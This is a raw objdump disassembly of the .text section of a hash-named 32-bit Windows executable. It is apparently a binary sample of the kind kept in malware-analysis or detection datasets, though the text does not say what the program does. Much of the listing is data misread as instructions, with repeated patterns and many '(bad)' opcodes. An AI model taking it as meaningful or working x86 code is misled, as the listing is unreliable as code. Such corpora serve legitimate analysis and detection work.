
f23096557edde4941aef678000e6723ae4c733f07f055d4025ba6d411fd1ecb5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	and    BYTE PTR [esi],dl
  401002:	inc    ebp
  401003:	add    BYTE PTR [esi+edx*1],ah
  401006:	inc    ebp
  401007:	add    BYTE PTR [esi+edx*1+0x45],cl
  40100b:	add    BYTE PTR [esi+edx*1+0x45],dl
  40100f:	add    BYTE PTR [eax+0x16],bl
  401012:	inc    ebp
  401013:	add    BYTE PTR [esi+edx*1],ch
  401016:	inc    ebp
  401017:	add    BYTE PTR [eax],dh
  401019:	push   ss
  40101a:	inc    ebp
  40101b:	add    BYTE PTR [esi+edx*1],dh
  40101e:	inc    ebp
  40101f:	add    BYTE PTR [eax],bh
  401021:	push   ss
  401022:	inc    ebp
  401023:	add    BYTE PTR [esi+edx*1],bh
  401026:	inc    ebp
  401027:	add    BYTE PTR [eax+0x16],al
  40102a:	inc    ebp
  40102b:	add    BYTE PTR [esi+edx*1+0x45],al
  40102f:	add    BYTE PTR [ebx+edx*1+0x13a00045],bl
  401036:	inc    ebp
  401037:	add    BYTE PTR [ebx+edx*1+0x13a80045],ah
  40103e:	inc    ebp
  40103f:	add    BYTE PTR [ebx+edx*1+0x13b00045],ch
  401046:	inc    ebp
  401047:	add    BYTE PTR [ebx+edx*1+0x13b80045],dh
  40104e:	inc    ebp
  40104f:	add    BYTE PTR [ebx+edx*1+0x13c00045],bh
  401056:	inc    ebp
  401057:	add    ah,al
  401059:	adc    eax,DWORD PTR [ebp+0x0]
  40105c:	enter  0x4513,0x0
  401060:	int3   
  401061:	adc    eax,DWORD PTR [ebp+0x0]
  401064:	rcl    BYTE PTR [ebx],1
  401066:	inc    ebp
  401067:	add    ah,dl
  401069:	adc    eax,DWORD PTR [ebp+0x0]
  40106c:	fcom   DWORD PTR [ebx]
  40106e:	inc    ebp
  40106f:	add    ah,bl
  401071:	adc    eax,DWORD PTR [ebp+0x0]
  401074:	loopne 0x401089
  401076:	inc    ebp
  401077:	add    ah,ah
  401079:	adc    eax,DWORD PTR [ebp+0x0]
  40107c:	call   0xec405594
  401081:	adc    eax,DWORD PTR [ebp+0x0]
  401084:	lock adc eax,DWORD PTR [ebp+0x0]
  401088:	hlt    
  401089:	adc    eax,DWORD PTR [ebp+0x0]
  40108c:	clc    
  40108d:	adc    eax,DWORD PTR [ebp+0x0]
  401090:	cld    
  401091:	adc    eax,DWORD PTR [ebp+0x0]
  401094:	add    BYTE PTR [eax*2+0x45140400],dl
  40109b:	add    BYTE PTR [eax],cl
  40109d:	adc    al,0x45
  40109f:	add    BYTE PTR [esp+edx*1],cl
  4010a2:	inc    ebp
  4010a3:	add    BYTE PTR [eax],dl
  4010a5:	adc    al,0x45
  4010a7:	add    BYTE PTR [esp+edx*1],dl
  4010aa:	inc    ebp
  4010ab:	add    BYTE PTR [eax],bl
  4010ad:	adc    al,0x45
  4010af:	add    BYTE PTR [esp+edx*1],bl
  4010b2:	inc    ebp
  4010b3:	add    BYTE PTR [eax],ah
  4010b5:	adc    al,0x45
  4010b7:	add    BYTE PTR [esp+edx*1],ah
  4010ba:	inc    ebp
  4010bb:	add    BYTE PTR [eax],ch
  4010bd:	adc    al,0x45
  4010bf:	add    BYTE PTR [esp+edx*1],ch
  4010c2:	inc    ebp
  4010c3:	add    BYTE PTR [eax],dh
  4010c5:	adc    al,0x45
  4010c7:	add    BYTE PTR [esp+edx*1],dh
  4010ca:	inc    ebp
  4010cb:	add    BYTE PTR [eax],bh
  4010cd:	adc    al,0x45
  4010cf:	add    BYTE PTR [esp+edx*1],bh
  4010d2:	inc    ebp
  4010d3:	add    BYTE PTR [eax+0x14],al
  4010d6:	inc    ebp
  4010d7:	add    BYTE PTR [esp+edx*1+0x45],al
  4010db:	add    BYTE PTR [eax+0x14],cl
  4010de:	inc    ebp
  4010df:	add    BYTE PTR [esp+edx*1+0x45],cl
  4010e3:	add    BYTE PTR [eax+0x14],dl
  4010e6:	inc    ebp
  4010e7:	add    BYTE PTR [esp+edx*1+0x45],dl
  4010eb:	add    BYTE PTR [eax+0x14],bl
  4010ee:	inc    ebp
  4010ef:	add    BYTE PTR [esp+edx*1+0x45],bl
  4010f3:	add    BYTE PTR [eax+0x14],ah
  4010f6:	inc    ebp
  4010f7:	add    BYTE PTR [esp+edx*1+0x45],ah
  4010fb:	add    BYTE PTR [eax+0x14],ch
  4010fe:	inc    ebp
  4010ff:	add    BYTE PTR [esp+edx*1+0x45],ch
  401103:	add    BYTE PTR [eax+0x14],dh
  401106:	inc    ebp
  401107:	add    BYTE PTR [esp+edx*1+0x45],dh
  40110b:	add    BYTE PTR [eax+0x14],bh
  40110e:	inc    ebp
  40110f:	add    BYTE PTR [esp+edx*1+0x45],bh
  401113:	add    BYTE PTR [eax-0x7bffbaec],al
  401119:	adc    al,0x45
  40111b:	add    BYTE PTR [eax-0x73ffbaec],cl
  401121:	adc    al,0x45
  401123:	add    BYTE PTR [eax-0x6bffbaec],dl
  401129:	adc    al,0x45
  40112b:	add    BYTE PTR [eax-0x1fffbaec],bl
  401131:	adc    eax,0x15e40045
  401136:	inc    ebp
  401137:	add    al,ch
  401139:	adc    eax,0x15ec0045
  40113e:	inc    ebp
  40113f:	add    al,dh
  401141:	adc    eax,0x15f40045
  401146:	inc    ebp
  401147:	add    al,bh
  401149:	adc    eax,0x15fc0045
  40114e:	inc    ebp
  40114f:	add    BYTE PTR [eax],al
  401151:	push   ss
  401152:	inc    ebp
  401153:	add    BYTE PTR [esi+edx*1],al
  401156:	inc    ebp
  401157:	add    BYTE PTR [eax],cl
  401159:	push   ss
  40115a:	inc    ebp
  40115b:	add    BYTE PTR [esi+edx*1],cl
  40115e:	inc    ebp
  40115f:	add    BYTE PTR [eax],dl
  401161:	push   ss
  401162:	inc    ebp
  401163:	add    BYTE PTR [esi+edx*1],dl
  401166:	inc    ebp
  401167:	add    BYTE PTR [eax],bl
  401169:	push   ss
  40116a:	inc    ebp
  40116b:	add    BYTE PTR [esp+edx*1+0x14a80045],ah
  401172:	inc    ebp
  401173:	add    BYTE PTR [esp+edx*1+0x14b00045],ch
  40117a:	inc    ebp
  40117b:	add    BYTE PTR [esp+edx*1+0x14b80045],dh
  401182:	inc    ebp
  401183:	add    BYTE PTR [esp+edx*1+0x14c00045],bh
  40118a:	inc    ebp
  40118b:	add    ah,al
  40118d:	adc    al,0x45
  40118f:	add    al,cl
  401191:	adc    al,0x45
  401193:	add    ah,cl
  401195:	adc    al,0x45
  401197:	add    al,dl
  401199:	adc    al,0x45
  40119b:	add    ah,dl
  40119d:	adc    al,0x45
  40119f:	add    al,bl
  4011a1:	adc    al,0x45
  4011a3:	add    ah,bl
  4011a5:	adc    al,0x45
  4011a7:	add    al,ah
  4011a9:	adc    al,0x45
  4011ab:	add    ah,ah
  4011ad:	adc    al,0x45
  4011af:	add    al,ch
  4011b1:	adc    al,0x45
  4011b3:	add    ah,ch
  4011b5:	adc    al,0x45
  4011b7:	add    al,dh
  4011b9:	adc    al,0x45
  4011bb:	add    ah,dh
  4011bd:	adc    al,0x45
  4011bf:	add    al,bh
  4011c1:	adc    al,0x45
  4011c3:	add    ah,bh
  4011c5:	adc    al,0x45
  4011c7:	add    BYTE PTR [eax],al
  4011c9:	adc    eax,0x15040045
  4011ce:	inc    ebp
  4011cf:	add    BYTE PTR [eax],cl
  4011d1:	adc    eax,0x150c0045
  4011d6:	inc    ebp
  4011d7:	add    BYTE PTR [eax],dl
  4011d9:	adc    eax,0x15140045
  4011de:	inc    ebp
  4011df:	add    BYTE PTR [eax],bl
  4011e1:	adc    eax,0x151c0045
  4011e6:	inc    ebp
  4011e7:	add    BYTE PTR [eax],ah
  4011e9:	adc    eax,0x15240045
  4011ee:	inc    ebp
  4011ef:	add    BYTE PTR [eax],ch
  4011f1:	adc    eax,0x152c0045
  4011f6:	inc    ebp
  4011f7:	add    BYTE PTR [eax],dh
  4011f9:	adc    eax,0x15340045
  4011fe:	inc    ebp
  4011ff:	add    BYTE PTR [eax],bh
  401201:	adc    eax,0x153c0045
  401206:	inc    ebp
  401207:	add    BYTE PTR [eax+0x15],al
  40120a:	inc    ebp
  40120b:	add    BYTE PTR [ebp+edx*1+0x45],al
  40120f:	add    BYTE PTR [eax+0x15],cl
  401212:	inc    ebp
  401213:	add    BYTE PTR [ebp+edx*1+0x45],cl
  401217:	add    BYTE PTR [eax+0x15],dl
  40121a:	inc    ebp
  40121b:	add    BYTE PTR [ebp+edx*1+0x45],dl
  40121f:	add    BYTE PTR [eax+0x15],bl
  401222:	inc    ebp
  401223:	add    BYTE PTR [ebp+edx*1+0x45],bl
  401227:	add    BYTE PTR [eax+0x15],ah
  40122a:	inc    ebp
  40122b:	add    BYTE PTR [ebp+edx*1+0x45],ah
  40122f:	add    BYTE PTR [eax+0x15],ch
  401232:	inc    ebp
  401233:	add    BYTE PTR [ebp+edx*1+0x45],ch
  401237:	add    BYTE PTR [eax+0x15],dh
  40123a:	inc    ebp
  40123b:	add    BYTE PTR [ebp+edx*1+0x45],dh
  40123f:	add    BYTE PTR [eax+0x15],bh
  401242:	inc    ebp
  401243:	add    BYTE PTR [ebp+edx*1+0x45],bh
  401247:	add    BYTE PTR [eax-0x7bffbaeb],al
  40124d:	adc    eax,0x15880045
  401252:	inc    ebp
  401253:	add    BYTE PTR [ebp+edx*1+0x15900045],cl
  40125a:	inc    ebp
  40125b:	add    BYTE PTR [ebp+edx*1+0x15980045],dl
  401262:	inc    ebp
  401263:	add    BYTE PTR [ebp+edx*1+0x15a00045],bl
  40126a:	inc    ebp
  40126b:	add    BYTE PTR [ebp+edx*1+0x15a80045],ah
  401272:	inc    ebp
  401273:	add    BYTE PTR [ebp+edx*1+0x15b00045],ch
  40127a:	inc    ebp
  40127b:	add    BYTE PTR [ebp+edx*1+0x15b80045],dh
  401282:	inc    ebp
  401283:	add    BYTE PTR [ebp+edx*1+0x15c00045],bh
  40128a:	inc    ebp
  40128b:	add    ah,al
  40128d:	adc    eax,0x15c80045
  401292:	inc    ebp
  401293:	add    ah,cl
  401295:	adc    eax,0x15d00045
  40129a:	inc    ebp
  40129b:	add    ah,dl
  40129d:	adc    eax,0x15d80045
  4012a2:	inc    ebp
  4012a3:	add    BYTE PTR [eax],al
  4012a5:	add    al,0x0
  4012a7:	add    BYTE PTR [edx-0x27],ah
  4012aa:	add    BYTE PTR [eax],al
  4012ac:	jp     0x401287
  4012ae:	add    BYTE PTR [eax],al
  4012b0:	fsubp  st(2),st
  4012b2:	nop
  4012b3:	xor    ebp,esi
  4012b5:	jmp    0x33a0:0xeade3398
  4012bc:	mov    esi,0x6233a8ea
  4012c1:	jns    0x4012c7
  4012c3:	add    BYTE PTR [esi+0x510000d9],ah
  4012c9:	out    dx,eax
  4012ca:	pop    ebx
  4012cb:	aaa    
  4012cc:	ret    0x6aee
  4012cf:	aaa    
  4012d0:	mov    ebp,0xc43778ee
  4012d5:	out    dx,al
  4012d6:	mov    ds:0xb8ee0c37,eax
  4012db:	aaa    
  4012dc:	push   cs
  4012dd:	out    dx,al
  4012de:	std    
  4012df:	aaa    
  4012e0:	dec    ecx
  4012e1:	loope  0x401304
  4012e3:	cmp    BYTE PTR [ebx-0x1f],bh
  4012e6:	lods   eax,DWORD PTR ds:[esi]
  4012e7:	cmp    dh,dl
  4012e9:	fist   WORD PTR [edi-0x5a1d08c6]
  4012ef:	cmp    dh,BYTE PTR [esi]
  4012f1:	jecxz  0x4012d0
  4012f3:	cmp    cl,BYTE PTR ds:0x153bd1e3
  4012f9:	loop   0x401291
  4012fb:	cmp    al,0xd9
  4012fd:	in     al,0xad
  4012ff:	cmp    al,0xb4
  401301:	in     al,0xc0
  401303:	cmp    al,0x7
  401305:	in     eax,0xf4
  401307:	cmp    al,0xd8
  401309:	in     al,0x12
  40130b:	cmp    eax,0x61e48f00
  401310:	cmp    eax,0x3d6fe43b
  401315:	dec    esp
  401316:	in     al,0x8c
  401318:	cmp    eax,0x3d9be3d7
  40131d:	add    esp,esp
  40131f:	stos   BYTE PTR es:[edi],al
  401320:	cmp    eax,0x3dbfe3f3
  401325:	xchg   ebp,eax
  401326:	jecxz  0x4012fd
  401328:	cmp    eax,0x3df1e385
  40132d:	cdq    
  40132e:	jecxz  0x401339
  401330:	ds jno 0x40131a
  401333:	and    DWORD PTR [esi],edi
  401335:	sub    ah,bh
  401337:	pop    esi
  401338:	ds push es
  40133a:	out    0x75,eax
  40133c:	ds clc 
  40133e:	out    0x92,al
  401340:	ds pushf 
  401342:	out    0xd8,al
  401344:	ds jg  0x40132d
  401347:	icebp  
  401348:	ds pop ecx
  40134a:	in     al,0x4
  40134c:	aas    
  40134d:	fs in  al,0x19
  401350:	aas    
  401351:	ins    BYTE PTR es:[edi],dx
  401352:	in     al,0x24
  401354:	aas    
  401355:	ja     0x40133b
  401357:	aas    
  401358:	aas    
  401359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40135a:	in     al,0x4a
  40135c:	aas    
  40135d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40135e:	in     al,0x55
  401360:	aas    
  401361:	mov    esp,esp
  401363:	pop    esi
  401364:	aas    
  401365:	mov    esi,0x9a3f72e4
  40136a:	in     al,0x7d
  40136c:	aas    
  40136d:	loopne 0x401353
  40136f:	lahf   
  401370:	aas    
  401371:	add    BYTE PTR [eax+0x263fd6e4],bh
  401377:	in     eax,0xe2
  401379:	aas    
  40137a:	push   cs
  40137b:	in     eax,0x0
  40137d:	add    BYTE PTR [edx+0x69],ah
  401380:	add    al,0x0
  401382:	inc    esi
  401383:	fld    DWORD PTR [eax]
  401385:	add    BYTE PTR [ecx+ebp*8+0x3b],cl
  401389:	xor    BYTE PTR [edx],ch
  40138b:	jmp    0xe97c43ec
  401390:	jae    0x4013c2
  401392:	dec    ebx
  401393:	jmp    0xea1b4419
  401398:	xchg   esp,eax
  401399:	xor    BYTE PTR [edx],cl
  40139b:	jmp    0x30c8:0xe9fb30b1
  4013a2:	(bad)  
  4013a3:	fld    DWORD PTR [eax]
  4013a5:	add    BYTE PTR [edx-0x27],ah
  4013a8:	add    BYTE PTR [eax],al
  4013aa:	(bad)  
  4013ab:	fld    DWORD PTR [eax]
  4013ad:	add    BYTE PTR [edx-0x27],ah
  4013b0:	add    BYTE PTR [eax],al
  4013b2:	(bad)  
  4013b3:	fld    DWORD PTR [eax]
  4013b5:	add    BYTE PTR [edx-0x27],ah
  4013b8:	add    BYTE PTR [eax],al
  4013ba:	(bad)  
  4013bb:	fld    DWORD PTR [eax]
  4013bd:	add    BYTE PTR [edx-0x27],ah
  4013c0:	add    BYTE PTR [eax],al
  4013c2:	(bad)  
  4013c3:	fld    DWORD PTR [eax]
  4013c5:	add    BYTE PTR [edx-0x27],ah
  4013c8:	add    BYTE PTR [eax],al
  4013ca:	(bad)  
  4013cb:	fld    DWORD PTR [eax]
  4013cd:	add    BYTE PTR [edx-0x27],ah
  4013d0:	add    BYTE PTR [eax],al
  4013d2:	(bad)  
  4013d3:	fld    DWORD PTR [eax]
  4013d5:	add    BYTE PTR [eax],al
  4013d7:	(bad)  
  4013d8:	fld    DWORD PTR [eax]
  4013da:	add    BYTE PTR [edx-0x27],ah
  4013dd:	add    BYTE PTR [eax],al
  4013df:	(bad)  
  4013e0:	fld    DWORD PTR [eax]
  4013e2:	add    BYTE PTR [edx-0x27],ah
  4013e5:	add    BYTE PTR [eax],al
  4013e7:	(bad)  
  4013e8:	fld    DWORD PTR [eax]
  4013ea:	add    BYTE PTR [edx-0x27],ah
  4013ed:	add    BYTE PTR [eax],al
  4013ef:	(bad)  
  4013f0:	fld    DWORD PTR [eax]
  4013f2:	add    BYTE PTR [edx-0x27],ah
  4013f5:	add    BYTE PTR [eax],al
  4013f7:	(bad)  
  4013f8:	fld    DWORD PTR [eax]
  4013fa:	add    BYTE PTR [edx-0x27],ah
  4013fd:	add    BYTE PTR [eax],al
  4013ff:	(bad)  
  401400:	fld    DWORD PTR [eax]
  401402:	add    BYTE PTR [edx-0x27],ah
  401405:	add    BYTE PTR [eax],al
  401407:	(bad)  
  401408:	fld    DWORD PTR [eax]
  40140a:	add    BYTE PTR [edx-0x27],ah
  40140d:	add    BYTE PTR [eax],al
  40140f:	(bad)  
  401410:	fld    DWORD PTR [eax]
  401412:	add    BYTE PTR [edx-0x27],ah
  401415:	add    BYTE PTR [eax],al
  401417:	(bad)  
  401418:	fld    DWORD PTR [eax]
  40141a:	add    BYTE PTR [edx-0x27],ah
  40141d:	add    BYTE PTR [eax],al
  40141f:	(bad)  
  401420:	fld    DWORD PTR [eax]
  401422:	add    BYTE PTR [edx-0x27],ah
  401425:	add    BYTE PTR [eax],al
  401427:	(bad)  
  401428:	fld    DWORD PTR [eax]
  40142a:	add    BYTE PTR [edx-0x27],ah
  40142d:	add    BYTE PTR [eax],al
  40142f:	(bad)  
  401430:	fld    DWORD PTR [eax]
  401432:	add    BYTE PTR [edx-0x27],ah
  401435:	add    BYTE PTR [eax],al
  401437:	(bad)  
  401438:	fld    DWORD PTR [eax]
  40143a:	add    BYTE PTR [eax],al
  40143c:	(bad)  
  40143d:	fld    DWORD PTR [eax]
  40143f:	add    BYTE PTR [edx-0x27],ah
  401442:	add    BYTE PTR [eax],al
  401444:	(bad)  
  401445:	fld    DWORD PTR [eax]
  401447:	add    BYTE PTR [edx-0x27],ah
  40144a:	add    BYTE PTR [eax],al
  40144c:	(bad)  
  40144d:	fld    DWORD PTR [eax]
  40144f:	add    BYTE PTR [edx-0x27],ah
  401452:	add    BYTE PTR [eax],al
  401454:	(bad)  
  401455:	fld    DWORD PTR [eax]
  401457:	add    BYTE PTR [edx-0x27],ah
  40145a:	add    BYTE PTR [eax],al
  40145c:	(bad)  
  40145d:	fld    DWORD PTR [eax]
  40145f:	add    BYTE PTR [edx-0x27],ah
  401462:	add    BYTE PTR [eax],al
  401464:	(bad)  
  401465:	fld    DWORD PTR [eax]
  401467:	add    BYTE PTR [edx-0x27],ah
  40146a:	add    BYTE PTR [eax],al
  40146c:	(bad)  
  40146d:	fld    DWORD PTR [eax]
  40146f:	add    BYTE PTR [edx-0x27],ah
  401472:	add    BYTE PTR [eax],al
  401474:	(bad)  
  401475:	fld    DWORD PTR [eax]
  401477:	add    BYTE PTR [edx-0x27],ah
  40147a:	add    BYTE PTR [eax],al
  40147c:	(bad)  
  40147d:	fld    DWORD PTR [eax]
  40147f:	add    BYTE PTR [edx-0x27],ah
  401482:	add    BYTE PTR [eax],al
  401484:	(bad)  
  401485:	fld    DWORD PTR [eax]
  401487:	add    BYTE PTR [edx-0x27],ah
  40148a:	add    BYTE PTR [eax],al
  40148c:	(bad)  
  40148d:	fld    DWORD PTR [eax]
  40148f:	add    BYTE PTR [edx-0x27],ah
  401492:	add    BYTE PTR [eax],al
  401494:	(bad)  
  401495:	fld    DWORD PTR [eax]
  401497:	add    BYTE PTR [edx-0x27],ah
  40149a:	add    BYTE PTR [eax],al
  40149c:	(bad)  
  40149d:	fld    DWORD PTR [eax]
  40149f:	add    BYTE PTR [eax],al
  4014a1:	(bad)  
  4014a2:	fld    DWORD PTR [eax]
  4014a4:	add    BYTE PTR [edx-0x27],ah
  4014a7:	add    BYTE PTR [eax],al
  4014a9:	(bad)  
  4014aa:	fld    DWORD PTR [eax]
  4014ac:	add    BYTE PTR [edx-0x27],ah
  4014af:	add    BYTE PTR [eax],al
  4014b1:	(bad)  
  4014b2:	fld    DWORD PTR [eax]
  4014b4:	add    BYTE PTR [edx-0x27],ah
  4014b7:	add    BYTE PTR [eax],al
  4014b9:	(bad)  
  4014ba:	fld    DWORD PTR [eax]
  4014bc:	add    BYTE PTR [edx-0x27],ah
  4014bf:	add    BYTE PTR [eax],al
  4014c1:	(bad)  
  4014c2:	fld    DWORD PTR [eax]
  4014c4:	add    BYTE PTR [edx-0x27],ah
  4014c7:	add    BYTE PTR [eax],al
  4014c9:	(bad)  
  4014ca:	fld    DWORD PTR [eax]
  4014cc:	add    BYTE PTR [edx-0x27],ah
  4014cf:	add    BYTE PTR [eax],al
  4014d1:	(bad)  
  4014d2:	fld    DWORD PTR [eax]
  4014d4:	add    BYTE PTR [edx-0x27],ah
  4014d7:	add    BYTE PTR [eax],al
  4014d9:	(bad)  
  4014da:	fld    DWORD PTR [eax]
  4014dc:	add    BYTE PTR [edx-0x27],ah
  4014df:	add    BYTE PTR [eax],al
  4014e1:	(bad)  
  4014e2:	fld    DWORD PTR [eax]
  4014e4:	add    BYTE PTR [edx-0x27],ah
  4014e7:	add    BYTE PTR [eax],al
  4014e9:	(bad)  
  4014ea:	fld    DWORD PTR [eax]
  4014ec:	add    BYTE PTR [edx-0x27],ah
  4014ef:	add    BYTE PTR [eax],al
  4014f1:	(bad)  
  4014f2:	fld    DWORD PTR [eax]
  4014f4:	add    BYTE PTR [edx-0x27],ah
  4014f7:	add    BYTE PTR [eax],al
  4014f9:	(bad)  
  4014fa:	fld    DWORD PTR [eax]
  4014fc:	add    BYTE PTR [edx-0x27],ah
  4014ff:	add    BYTE PTR [eax],al
  401501:	(bad)  
  401502:	fld    DWORD PTR [eax]
  401504:	add    BYTE PTR [eax],al
  401506:	(bad)  
  401507:	fld    DWORD PTR [eax]
  401509:	add    BYTE PTR [edx-0x27],ah
  40150c:	add    BYTE PTR [eax],al
  40150e:	(bad)  
  40150f:	fld    DWORD PTR [eax]
  401511:	add    BYTE PTR [edx-0x27],ah
  401514:	add    BYTE PTR [eax],al
  401516:	(bad)  
  401517:	fld    DWORD PTR [eax]
  401519:	add    BYTE PTR [edx-0x27],ah
  40151c:	add    BYTE PTR [eax],al
  40151e:	(bad)  
  40151f:	fld    DWORD PTR [eax]
  401521:	add    BYTE PTR [edx-0x27],ah
  401524:	add    BYTE PTR [eax],al
  401526:	(bad)  
  401527:	fld    DWORD PTR [eax]
  401529:	add    BYTE PTR [edx-0x27],ah
  40152c:	add    BYTE PTR [eax],al
  40152e:	(bad)  
  40152f:	fld    DWORD PTR [eax]
  401531:	add    BYTE PTR [edx-0x27],ah
  401534:	add    BYTE PTR [eax],al
  401536:	(bad)  
  401537:	fld    DWORD PTR [eax]
  401539:	add    BYTE PTR [edx-0x27],ah
  40153c:	add    BYTE PTR [eax],al
  40153e:	(bad)  
  40153f:	fld    DWORD PTR [eax]
  401541:	add    BYTE PTR [edx-0x27],ah
  401544:	add    BYTE PTR [eax],al
  401546:	(bad)  
  401547:	fld    DWORD PTR [eax]
  401549:	add    BYTE PTR [edx-0x27],ah
  40154c:	add    BYTE PTR [eax],al
  40154e:	(bad)  
  40154f:	fld    DWORD PTR [eax]
  401551:	add    BYTE PTR [edx-0x27],ah
  401554:	add    BYTE PTR [eax],al
  401556:	(bad)  
  401557:	fld    DWORD PTR [eax]
  401559:	add    BYTE PTR [edx-0x27],ah
  40155c:	add    BYTE PTR [eax],al
  40155e:	(bad)  
  40155f:	fld    DWORD PTR [eax]
  401561:	add    BYTE PTR [edx-0x27],ah
  401564:	add    BYTE PTR [eax],al
  401566:	(bad)  
  401567:	fld    DWORD PTR [eax]
  401569:	add    BYTE PTR [eax],al
  40156b:	(bad)  
  40156c:	fld    DWORD PTR [eax]
  40156e:	add    BYTE PTR [edx-0x27],ah
  401571:	add    BYTE PTR [eax],al
  401573:	(bad)  
  401574:	fld    DWORD PTR [eax]
  401576:	add    BYTE PTR [edx-0x27],ah
  401579:	add    BYTE PTR [eax],al
  40157b:	(bad)  
  40157c:	fld    DWORD PTR [eax]
  40157e:	add    BYTE PTR [edx-0x27],ah
  401581:	add    BYTE PTR [eax],al
  401583:	(bad)  
  401584:	fld    DWORD PTR [eax]
  401586:	add    BYTE PTR [edx-0x27],ah
  401589:	add    BYTE PTR [eax],al
  40158b:	(bad)  
  40158c:	fld    DWORD PTR [eax]
  40158e:	add    BYTE PTR [edx-0x27],ah
  401591:	add    BYTE PTR [eax],al
  401593:	(bad)  
  401594:	fld    DWORD PTR [eax]
  401596:	add    BYTE PTR [edx-0x27],ah
  401599:	add    BYTE PTR [eax],al
  40159b:	(bad)  
  40159c:	fld    DWORD PTR [eax]
  40159e:	add    BYTE PTR [edx-0x27],ah
  4015a1:	add    BYTE PTR [eax],al
  4015a3:	(bad)  
  4015a4:	fld    DWORD PTR [eax]
  4015a6:	add    BYTE PTR [edx-0x27],ah
  4015a9:	add    BYTE PTR [eax],al
  4015ab:	(bad)  
  4015ac:	fld    DWORD PTR [eax]
  4015ae:	add    BYTE PTR [edx-0x27],ah
  4015b1:	add    BYTE PTR [eax],al
  4015b3:	(bad)  
  4015b4:	fld    DWORD PTR [eax]
  4015b6:	add    BYTE PTR [edx-0x27],ah
  4015b9:	add    BYTE PTR [eax],al
  4015bb:	(bad)  
  4015bc:	fld    DWORD PTR [eax]
  4015be:	add    BYTE PTR [edx-0x27],ah
  4015c1:	add    BYTE PTR [eax],al
  4015c3:	(bad)  
  4015c4:	fld    DWORD PTR [eax]
  4015c6:	add    BYTE PTR [edx-0x27],ah
  4015c9:	add    BYTE PTR [eax],al
  4015cb:	(bad)  
  4015cc:	fld    DWORD PTR [eax]
  4015ce:	add    BYTE PTR [eax],al
  4015d0:	(bad)  
  4015d1:	fld    DWORD PTR [eax]
  4015d3:	add    BYTE PTR [edx-0x27],ah
  4015d6:	add    BYTE PTR [eax],al
  4015d8:	(bad)  
  4015d9:	fld    DWORD PTR [eax]
  4015db:	add    BYTE PTR [edx-0x27],ah
  4015de:	add    BYTE PTR [eax],al
  4015e0:	(bad)  
  4015e1:	fld    DWORD PTR [eax]
  4015e3:	add    BYTE PTR [edx-0x27],ah
  4015e6:	add    BYTE PTR [eax],al
  4015e8:	(bad)  
  4015e9:	fld    DWORD PTR [eax]
  4015eb:	add    BYTE PTR [edx-0x27],ah
  4015ee:	add    BYTE PTR [eax],al
  4015f0:	(bad)  
  4015f1:	fld    DWORD PTR [eax]
  4015f3:	add    BYTE PTR [edx-0x27],ah
  4015f6:	add    BYTE PTR [eax],al
  4015f8:	(bad)  
  4015f9:	fld    DWORD PTR [eax]
  4015fb:	add    BYTE PTR [edx-0x27],ah
  4015fe:	add    BYTE PTR [eax],al
  401600:	(bad)  
  401601:	fld    DWORD PTR [eax]
  401603:	add    BYTE PTR [edx-0x27],ah
  401606:	add    BYTE PTR [eax],al
  401608:	(bad)  
  401609:	fld    DWORD PTR [eax]
  40160b:	add    BYTE PTR [edx-0x27],ah
  40160e:	add    BYTE PTR [eax],al
  401610:	(bad)  
  401611:	fld    DWORD PTR [eax]
  401613:	add    BYTE PTR [edx-0x27],ah
  401616:	add    BYTE PTR [eax],al
  401618:	(bad)  
  401619:	fld    DWORD PTR [eax]
  40161b:	add    BYTE PTR [edx-0x27],ah
  40161e:	add    BYTE PTR [eax],al
  401620:	(bad)  
  401621:	fld    DWORD PTR [eax]
  401623:	add    BYTE PTR [edx-0x27],ah
  401626:	add    BYTE PTR [eax],al
  401628:	(bad)  
  401629:	fld    DWORD PTR [eax]
  40162b:	add    BYTE PTR [edx-0x27],ah
  40162e:	add    BYTE PTR [eax],al
  401630:	(bad)  
  401631:	fld    DWORD PTR [eax]
  401633:	add    BYTE PTR [eax],al
  401635:	(bad)  
  401636:	fld    DWORD PTR [eax]
  401638:	add    BYTE PTR [edx-0x27],ah
  40163b:	add    BYTE PTR [eax],al
  40163d:	(bad)  
  40163e:	fld    DWORD PTR [eax]
  401640:	add    BYTE PTR [edx-0x27],ah
  401643:	add    BYTE PTR [eax],al
  401645:	(bad)  
  401646:	fld    DWORD PTR [eax]
  401648:	add    BYTE PTR [edx-0x27],ah
  40164b:	add    BYTE PTR [eax],al
  40164d:	(bad)  
  40164e:	fld    DWORD PTR [eax]
  401650:	add    BYTE PTR [edx-0x27],ah
  401653:	add    BYTE PTR [eax],al
  401655:	(bad)  
  401656:	fld    DWORD PTR [eax]
  401658:	add    BYTE PTR [edx-0x27],ah
  40165b:	add    BYTE PTR [eax],al
  40165d:	(bad)  
  40165e:	fld    DWORD PTR [eax]
  401660:	add    BYTE PTR [edx-0x27],ah
  401663:	add    BYTE PTR [eax],al
  401665:	(bad)  
  401666:	fld    DWORD PTR [eax]
  401668:	add    BYTE PTR [edx-0x27],ah
  40166b:	add    BYTE PTR [eax],al
  40166d:	(bad)  
  40166e:	fld    DWORD PTR [eax]
  401670:	add    BYTE PTR [edx-0x27],ah
  401673:	add    BYTE PTR [eax],al
  401675:	(bad)  
  401676:	fld    DWORD PTR [eax]
  401678:	add    BYTE PTR [edx-0x27],ah
  40167b:	add    BYTE PTR [eax],al
  40167d:	(bad)  
  40167e:	fld    DWORD PTR [eax]
  401680:	add    BYTE PTR [edx-0x27],ah
  401683:	add    BYTE PTR [eax],al
  401685:	(bad)  
  401686:	fld    DWORD PTR [eax]
  401688:	add    BYTE PTR [edx-0x27],ah
  40168b:	add    BYTE PTR [eax],al
  40168d:	(bad)  
  40168e:	fld    DWORD PTR [eax]
  401690:	add    BYTE PTR [edx-0x27],ah
  401693:	add    BYTE PTR [eax],al
  401695:	(bad)  
  401696:	fld    DWORD PTR [eax]
  401698:	add    BYTE PTR [eax],al
  40169a:	(bad)  
  40169b:	fld    DWORD PTR [eax]
  40169d:	add    BYTE PTR [edx-0x27],ah
  4016a0:	add    BYTE PTR [eax],al
  4016a2:	(bad)  
  4016a3:	fld    DWORD PTR [eax]
  4016a5:	add    BYTE PTR [edx-0x27],ah
  4016a8:	add    BYTE PTR [eax],al
  4016aa:	(bad)  
  4016ab:	fld    DWORD PTR [eax]
  4016ad:	add    BYTE PTR [edx-0x27],ah
  4016b0:	add    BYTE PTR [eax],al
  4016b2:	add    BYTE PTR [edi+0x6b620004],ch
  4016b8:	inc    esp
